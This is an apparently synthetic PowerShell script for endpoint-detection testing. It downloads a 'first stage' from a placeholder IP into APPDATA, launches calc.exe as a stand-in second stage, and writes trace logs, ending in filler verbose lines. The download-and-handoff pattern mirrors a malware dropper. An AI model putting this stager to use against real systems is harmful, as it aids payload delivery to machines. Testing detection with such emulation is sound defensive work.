
<#
.SYNOPSIS
    Multi-stage download and handoff workflow.

.DESCRIPTION
    Downloads a first-stage script, verifies the drop path, then
    invokes a second-stage helper that performs the handoff.
    Both stages share the same bounded timeout and retry policy.

.NOTES
    Intended for controlled endpoint testing.
#>
[CmdletBinding()]
param(
    [string]$Stage2Url = "https://203.0.113.89/stage1.ps1",
    [string]$PayloadPath = "$env:APPDATA\stage1.bin",
    [string]$TracePath = "$env:TEMP\telemetry.json",
    [int]$TimeoutSec = 207
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# First stage
function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 207
    )

    Write-Verbose ("Downloading first stage from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    if (-not (Test-Path -Path $DestinationPath)) {
        throw "First stage was not written to disk"
    }
    return $DownloadedPath = $DestinationPath
}

# Second stage
function Invoke-Stage2Execution {
    param(
        [string]$StagedPath = "",
        [int]$DelaySeconds = 2
    )

    Write-Verbose ("Preparing handoff for " + $StagedPath)
    Start-Sleep -Seconds $DelaySeconds
    Start-Process -FilePath "calc.exe"
    Write-Verbose "Second stage handoff complete"
    return $true
}

Write-Verbose "Starting multi-stage workflow"
$OperationResult = Invoke-Stage1Download -SourceUrl $Stage2Url -DestinationPath $PayloadPath -TimeoutSec $TimeoutSec
if ($OperationResult) {
    $HandoffResult = Invoke-Stage2Execution -StagedPath $PayloadPath
    Write-Verbose ("Handoff result: " + $HandoffResult)
}
else {
    Write-Warning "First stage did not complete"
}

$StageSummary = [ordered]@{
    Stage1 = "download"
    Stage2 = "handoff"
    Endpoint = $Stage2Url
    Destination = $PayloadPath
    TimeoutSec = $TimeoutSec
}
$StageSummary | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Preparing working directory"
Write-Verbose "Collecting host metadata"
Write-Verbose "Resolving configured target"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Exporting operation report"
Write-Verbose "Retry budget remaining"
Write-Verbose "Reading configuration values"
Write-Verbose "Operation completed"
Write-Verbose "Starting workflow"
Write-Output "stage 41 initialized"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
Write-Verbose "stage marker 25 reached"
